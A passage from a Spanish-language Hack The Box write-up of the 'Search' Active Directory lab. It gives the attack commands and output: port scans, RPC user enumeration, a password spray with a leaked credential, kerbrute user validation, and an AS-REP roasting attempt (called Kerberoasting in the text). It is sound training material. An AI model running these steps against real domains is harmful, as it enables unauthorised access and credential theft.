---
layout: single
title: Search - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Search de la plataforma de Hack The Box que es un entorno de Directorio Activo donde vamos a estar enumerando por los protocolos SMB, RPC, además de estar haciendo un Kerberoast attack y obtener un XLSX que contiene data muy importante como usuarios y credenciales que usaremos para obtener certificados y conectarnos a un Windows PowerShell Web Access donde gracias a bloodhound sabremos la vía para escalar privilegios le vamos a cambiar la contraseña a un usuario que pertenece dentro del grupo Domain Admins y nos conectaremos con wmiexec para ver la ultima flag"
date: 2024-04-08
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-search/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Active Directory
  - RPC Enumeration
  - Bloodhound Enumeration
  - Kerberoasting Attack
  - SMB Password Spray
  - pfx certificates
  - Windows PowerShell Web Access
  - GenericAll privilege
  - ReadGMSAPassword privilege
---

## PortScan

- Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo `TCP`.

| Parámetro       | Uso                                                                                                                                                                                                                                                                                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -p-             | Escanear todo el rango de puertos (65535) por el protocolo TCP.                                                                                                                                                                                                                                                                                                      |
| --open          | Solo queremos ver puertos abiertos.                                                                                                                                                                                                                                                                                                                                  |
| -sS             | TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls. |
| --min-rate 5000 | Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.                                                                                                                                                                                                                                                                                          |
| -vvv            | Para que nos reporte los puertos que vaya encontrando por la consola.                                                                                                                                                                                                                                                                                                |
| -n              | Para que no aplique resolución DNS.                                                                                                                                                                                                                                                                                                                                  |
| -Pn             | Esto es para indicarle que omita el descubrimiento de hosts.                                                                                                                                                                                                                                                                                                         |
| -oG             | Para exportar la salida en formato Greppable.                                                                                                                                                                                                                                                                                                                        |


```bash
➜  nmap sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.57 -oG allPorts
[sudo] password for miguel:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-07 14:28 CST
Initiating SYN Stealth Scan at 14:28
Scanning 10.129.229.57 [65535 ports]
Discovered open port 139/tcp on 10.129.229.57
Discovered open port 135/tcp on 10.129.229.57
Discovered open port 80/tcp on 10.129.229.57
Discovered open port 53/tcp on 10.129.229.57
Discovered open port 445/tcp on 10.129.229.57
Discovered open port 443/tcp on 10.129.229.57
Discovered open port 9389/tcp on 10.129.229.57
Discovered open port 49724/tcp on 10.129.229.57
Discovered open port 3269/tcp on 10.129.229.57
Discovered open port 8172/tcp on 10.129.229.57
Discovered open port 49699/tcp on 10.129.229.57
Discovered open port 3268/tcp on 10.129.229.57
Discovered open port 49692/tcp on 10.129.229.57
Discovered open port 464/tcp on 10.129.229.57
Discovered open port 389/tcp on 10.129.229.57
Increasing send delay for 10.129.229.57 from 0 to 5 due to 12 out of 38 dropped probes since last increase.
Discovered open port 88/tcp on 10.129.229.57
Increasing send delay for 10.129.229.57 from 5 to 10 due to 11 out of 20 dropped probes since last increase.
Completed SYN Stealth Scan at 14:29, 67.08s elapsed (65535 total ports)
Nmap scan report for 10.129.229.57
Host is up, received user-set (0.44s latency).
Scanned at 2024-04-07 14:28:44 CST for 67s
Not shown: 65519 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
8172/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49724/tcp open  unknown          syn-ack ttl 127
```

- Ahora usamos la función `extractPorts` para copear los puertos abiertos a la `clipboard` y escanear los servicios que corren en los puertos.

```bash
➜  nmap which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```

- La ejecutamos y nos copea los puertos.

```bash
➜  nmap extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.229.57
	[*] Open ports: 53,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724

[*] Ports copied to clipboard
```

- Ahora seguimos con el escaneo de los servicios de los puertos abiertos.

| Uso                                                                                      | Párametro |
| ---------------------------------------------------------------------------------------- | --------- |
| Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos. | -sCV      |
| Que no lo exporte a un archivo normal.                                                   | -oN       |

- Y listo.

```bash
➜  nmap sudo nmap -sCV -p53,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724 10.129.229.57 -oN targeted
[sudo] password for miguel:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-07 14:48 CST
Nmap scan report for 10.129.229.57
Host is up (0.49s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-07 20:49:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-07T20:50:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: Search &mdash; Just Testing IIS
|_ssl-date: 2024-04-07T20:50:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-07T20:50:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-07T20:50:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2024-04-07T20:50:38+00:00; 0s from scanner time.
| tls-alpn:
|_  http/1.1
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
49692/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-07T20:50:03
|_  start_date: N/A
```

## Enumeración

- Vemos el puerto 80 abierto vamos a ver las tecnologías que se están empleando.

```ruby
➜  nmap whatweb http://10.129.229.57
http://10.129.229.57 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.229.57], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &mdash; Just Testing IIS], X-Powered-By[ASP.NET]
```

- Vemos que tenemos un posible subdominio existente en la maquina que se llama `search.htb` así que vamos agregarlo al `/etc/hosts` en caso de que se este aplicando `Virtual Hosting`.

```bash
➜  nmap echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
10.129.229.57 search.htb
```

- Aquí vemos el mismo nombre si usamos `crackmapexec`.

```bash
➜  nmap crackmapexec smb 10.129.229.57
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
```

- Tenemos muchos puertos abiertos pero como estamos ante un Entorno de Directorio Activo podemos comenzar enumerando el servicio `RPC` para ver si podemos enumerar usuarios del dominio empleando un `Null Session` por que no disponemos de credenciales.

- No podemos enumerar.

```bash
➜  nmap rpcclient -U "" 10.129.229.57 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

- No encontramos nada por que necesitamos de disponer de credenciales validas pero también tenemos el puerto 443 abierto podemos inspeccionar el certificado por casi siempre encontramos información valiosa.

```bash
➜  nmap openssl s_client -connect 10.129.229.57:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = research.search.htb, CN = research
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = research.search.htb, CN = research
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 CN = research.search.htb, CN = research
verify return:1
---
Certificate chain
 0 s:CN = research.search.htb, CN = research
   i:DC = htb, DC = search, CN = search-RESEARCH-CA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Aug 11 08:13:35 2020 GMT; NotAfter: Aug  9 08:13:35 2030 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
-----END CERTIFICATE-----
subject=CN = research.search.htb, CN = research
issuer=DC = htb, DC = search, CN = search-RESEARCH-CA
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA
Server Temp Key: ECDH, secp384r1, 384 bits
---
SSL handshake has read 1907 bytes and written 581 bytes
Verification error: unable to verify the first certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: DD43000058B89B34DEC8D6F721AFE9AE4CD04A82C34216BE763E4ADCE3E1E92F
    Session-ID-ctx:
    Master-Key: 9DC677241F4C42AEFDA506C7334AD059E4B16040E59E07F6E820712A1E3A7B821A639EF56E7574ACD0B809159AECB46D
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1712523918
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
    Extended master secret: yes
---
```

- Encontramos un subdominio a si que vamos agregarlo al **/etc/hosts**.

```bash
➜  nmap cat /etc/hosts | tail -n 1
10.129.229.57 search.htb research.search.htb
```

- Pero si vemos las paginas webs vemos que las 3 son los mismo.

<p align="center">
<img src="/assets/images/htb-writeup-search/1.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-search/2.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-search/3.png">
</p>

## hope.sharp

- Si vemos en las imágenes que nos muestran en la web hay una contraseña y un usuario básicamente un `Information Leakage`.

<p align="center">
<img src="/assets/images/htb-writeup-search/4.png">
</p>

- Para validar si es un usuario valido vamos a hacer varios ejemplos del nombre de usuario por que no sabemos como es que lo representa a si que vamos a crear un `.txt`.

```bash
➜  content cat users.txt
hopesharp
h.sharp
hope.s
h.sharp
hope.sharp
H.Sharp
Hope.Sharp
```

- Podemos hacerlo con `kerbrute` o con `crackmapexec`.

```bash
➜  content crackmapexec smb 10.129.229.57 -u users.txt -p 'IsolationIsKey?' --continue-on-success
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?
SMB         10.129.229.57   445    RESEARCH         [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Hope.Sharp:IsolationIsKey?
```

- Básicamente es el mismo usuario `Hope.Sharp` y `hope.sharp`.

```bash
➜  content ./kerbrute userenum -d search.htb --dc research.search.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 04/07/24 - Ronnie Flathers @ropnop

2024/04/07 15:24:20 >  Using KDC(s):
2024/04/07 15:24:20 >  	research.search.htb:88

2024/04/07 15:24:20 >  [+] VALID USERNAME:	 Hope.Sharp@search.htb
2024/04/07 15:24:20 >  [+] VALID USERNAME:	 hope.sharp@search.htb
2024/04/07 15:24:20 >  Done! Tested 7 usernames (2 valid) in 0.096 seconds
```

- Si recordamos tenemos el `RPC` abierto y como ahora si tenemos credenciales vamos a conectarnos para enumerar usuarios.

```bash
➜  content rpcclient -U "hope.sharp%IsolationIsKey?" 10.129.229.57
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Santino.Benjamin] rid:[0x4aa]
user:[Payton.Harmon] rid:[0x4ab]
user:[Trace.Ryan] rid:[0x4ac]
user:[Reginald.Morton] rid:[0x4ad]
user:[Eddie.Stevens] rid:[0x4ae]
user:[Cortez.Hickman] rid:[0x4af]
user:[Chace.Oneill] rid:[0x4b0]
user:[Abril.Suarez] rid:[0x4b1]
user:[Savanah.Velazquez] rid:[0x4b2]
user:[Antony.Russo] rid:[0x4b3]
user:[Cameron.Melendez] rid:[0x4b4]
user:[Edith.Walls] rid:[0x4b5]
user:[Lane.Wu] rid:[0x4b6]
user:[Arielle.Schultz] rid:[0x4b7]
user:[Bobby.Wolf] rid:[0x4b8]
user:[Blaine.Zavala] rid:[0x4b9]
user:[Margaret.Robinson] rid:[0x4ba]
user:[Celia.Moreno] rid:[0x4bb]
user:[Kaitlynn.Lee] rid:[0x4bc]
user:[Kyler.Arias] rid:[0x4bd]
user:[Saniyah.Roy] rid:[0x4be]
user:[Sarai.Boone] rid:[0x4bf]
user:[Jermaine.Franco] rid:[0x4c0]
user:[Alfred.Chan] rid:[0x4c1]
user:[Jamar.Holt] rid:[0x4c2]
user:[Sandra.Wolfe] rid:[0x4c3]
user:[Rene.Larson] rid:[0x4c4]
user:[Yareli.Mcintyre] rid:[0x4c5]
user:[Griffin.Maddox] rid:[0x4c6]
user:[Prince.Hobbs] rid:[0x4c7]
user:[Armando.Nash] rid:[0x4c8]
user:[Sonia.Schneider] rid:[0x4c9]
user:[Maeve.Mann] rid:[0x4ca]
user:[Lizeth.Love] rid:[0x4cb]
user:[Amare.Serrano] rid:[0x4cc]
user:[Savanah.Knox] rid:[0x4cd]
user:[Frederick.Cuevas] rid:[0x4ce]
user:[Marshall.Skinner] rid:[0x4cf]
user:[Edgar.Jacobs] rid:[0x4d0]
user:[Elisha.Watts] rid:[0x4d1]
user:[Belen.Compton] rid:[0x4d2]
user:[Amari.Mora] rid:[0x4d3]
user:[Cadence.Conner] rid:[0x4d4]
user:[Katelynn.Costa] rid:[0x4d5]
user:[Sage.Henson] rid:[0x4d6]
user:[Maren.Guzman] rid:[0x4d7]
user:[Natasha.Mayer] rid:[0x4d8]
user:[Chanel.Bell] rid:[0x4d9]
user:[Scarlett.Parks] rid:[0x4da]
user:[Eliezer.Jordan] rid:[0x4db]
user:[Dax.Santiago] rid:[0x4dc]
user:[Lillie.Saunders] rid:[0x4dd]
user:[Jayla.Roberts] rid:[0x4de]
user:[Lorelei.Huang] rid:[0x4df]
user:[Taniya.Hardy] rid:[0x4e0]
user:[Charlee.Wilkinson] rid:[0x4e1]
user:[Monique.Moreno] rid:[0x4e2]
user:[Desmond.Bonilla] rid:[0x4e3]
user:[Claudia.Sharp] rid:[0x4e4]
user:[Abbigail.Turner] rid:[0x4e5]
user:[Yaritza.Riddle] rid:[0x4e6]
user:[Tori.Mora] rid:[0x4e7]
user:[Hugo.Forbes] rid:[0x4e8]
user:[Jolie.Lee] rid:[0x4e9]
user:[German.Rice] rid:[0x4ea]
user:[Zain.Hopkins] rid:[0x4eb]
user:[Hope.Sharp] rid:[0x4ec]
user:[Kylee.Davila] rid:[0x4ed]
user:[Melanie.Santiago] rid:[0x4ee]
user:[Hunter.Kirby] rid:[0x4ef]
user:[Annabelle.Wells] rid:[0x4f0]
user:[Ada.Gillespie] rid:[0x4f1]
user:[Gunnar.Callahan] rid:[0x4f2]
user:[Aarav.Fry] rid:[0x4f3]
user:[Colby.Russell] rid:[0x4f4]
user:[Eve.Galvan] rid:[0x4f5]
user:[Jeramiah.Fritz] rid:[0x4f6]
user:[Cade.Austin] rid:[0x4f7]
user:[Keely.Lyons] rid:[0x4f8]
user:[Abby.Gonzalez] rid:[0x4f9]
user:[Joy.Costa] rid:[0x4fa]
user:[Vincent.Sutton] rid:[0x4fb]
user:[Cesar.Yang] rid:[0x4fc]
user:[Camren.Luna] rid:[0x4fd]
user:[Tyshawn.Peck] rid:[0x4fe]
user:[Keith.Hester] rid:[0x4ff]
user:[Braeden.Rasmussen] rid:[0x500]
user:[Angel.Atkinson] rid:[0x501]
user:[Sierra.Frye] rid:[0x502]
user:[Maci.Graves] rid:[0x503]
user:[Judah.Frye] rid:[0x504]
user:[Tristen.Christian] rid:[0x505]
user:[Crystal.Greer] rid:[0x506]
user:[Kayley.Ferguson] rid:[0x507]
user:[Haven.Summers] rid:[0x508]
user:[Isabela.Estrada] rid:[0x509]
user:[Kaylin.Bird] rid:[0x50a]
user:[Angie.Duffy] rid:[0x50b]
user:[Claudia.Pugh] rid:[0x50c]
user:[Jordan.Gregory] rid:[0x50d]
user:[web_svc] rid:[0x510]
user:[Tristan.Davies] rid:[0x512]
```

- Vamos añadirlos a una lista.

```bash
➜  content rpcclient -U "hope.sharp%IsolationIsKey?" 10.129.229.57 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > all.txt
```

- Vamos aplicar un `Kerberoasting Attack` <https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/>.

- Pero no tenemos existo ya que los usuarios no tienen el `UF_DONT_REQUIERE_PREAUTH` set.

```bash
➜  content impacket-GetNPUsers search.htb/ -no-pass -usersfile all.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Santino.Benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Payton.Harmon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Trace.Ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Reginald.Morton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Eddie.Stevens doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cortez.Hickman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Chace.Oneill doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Abril.Suarez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Savanah.Velazquez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Antony.Russo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cameron.Melendez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Edith.Walls doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lane.Wu doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Arielle.Schultz doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Bobby.Wolf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Blaine.Zavala doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Margaret.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Celia.Moreno doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlynn.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kyler.Arias doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Saniyah.Roy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sarai.Boone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jermaine.Franco doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Alfred.Chan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jamar.Holt doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sandra.Wolfe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Rene.Larson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Yareli.Mcintyre doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Griffin.Maddox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Prince.Hobbs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Armando.Nash doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sonia.Schneider doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Maeve.Mann doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lizeth.Love doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Amare.Serrano doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Savanah.Knox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Frederick.Cuevas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Marshall.Skinner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Edgar.Jacobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Elisha.Watts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Belen.Compton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Amari.Mora doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cadence.Conner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Katelynn.Costa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sage.Henson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Maren.Guzman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Natasha.Mayer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Chanel.Bell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scarlett.Parks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Eliezer.Jordan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Dax.Santiago doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lillie.Saunders doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jayla.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lorelei.Huang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Taniya.Hardy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Charlee.Wilkinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Monique.Moreno doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Desmond.Bonilla doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Claudia.Sharp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Abbigail.Turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Yaritza.Riddle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tori.Mora doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Hugo.Forbes doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jolie.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User German.Rice doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Zain.Hopkins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Hope.Sharp doesn't have UF_DONT_REQUIRE_PREAUTH set
